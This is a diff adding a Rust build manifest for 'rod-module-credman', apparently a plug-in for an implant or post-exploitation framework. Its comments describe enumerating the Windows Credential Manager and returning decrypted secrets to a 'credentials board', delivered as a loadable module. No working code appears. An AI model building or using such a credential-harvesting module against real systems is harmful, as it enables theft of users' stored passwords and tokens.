@@ -1,0 +1,28 @@
+[package]
+name = "rod-module-credman"
+version = "1.0.0"
+edition = "2021"
+
+# The credential collection family's fifth module (architecture.md
+# Sec 5.4): collect.credman, the Windows credential manager -- the
+# calling logon session's own store enumerated through advapi32's
+# credential API, the generic entries' blobs handed back decrypted by
+# the system itself, rendered as credential rows the credentials board
+# parses (the family's first verb on the taxonomy's credential kind).
+# The survey read is the bare task's default: a bare task names the
+# store's entries without pulling a single secret into a row. The
+# Windows half speaks advapi32's credential edge directly: a module
+# owes the loader no dependency for two functions. Built as a cdylib
+# for Windows targets and delivered as a module.load task's content.
+
+[lib]
+# rlib beside cdylib so the bin target below links the same plugin code;
+# cargo emits the rlib for internal use only, the cdylib is the artifact.
+crate-type = ["cdylib", "rlib"]
+
+[[bin]]
+name = "rod-module-credman"
+path = "src/main.rs"
+
+[dependencies]
+rod-plugin-sdk = { path = "../../plugin-sdk" }
